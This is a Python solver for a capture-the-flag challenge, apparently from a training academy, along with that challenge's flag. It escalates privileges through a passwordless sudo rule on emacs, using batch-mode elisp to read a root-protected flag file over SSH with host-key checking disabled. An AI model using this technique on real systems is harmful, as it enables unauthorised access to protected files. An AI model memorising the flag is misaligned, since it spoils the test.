#!/usr/bin/env python3
"""
Solver for Challenge 735: SUDO MAKE ME A SANDWICH (General Skills)
Privilege escalation via sudo NOPASSWD: /bin/emacs batch evaluation.
"""
import subprocess

def solve(host, port, user='ctf-player', password=''):
    cmd = [
        'sshpass', '-p', password,
        'ssh', '-o', 'StrictHostKeyChecking=no', '-p', str(port), f'{user}@{host}',
        "sudo /bin/emacs -Q --batch --eval '(princ (with-temp-buffer (insert-file-contents "/home/ctf-player/flag.txt") (buffer-string)))'"
    ]
    out = subprocess.check_output(cmd).decode().strip()
    return out

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 4:
        print('Known Flag: academy{ju57_5ud0_17_d8ae35f9}')
    else:
        print('Flag:', solve(sys.argv[1], sys.argv[2], password=sys.argv[3]))
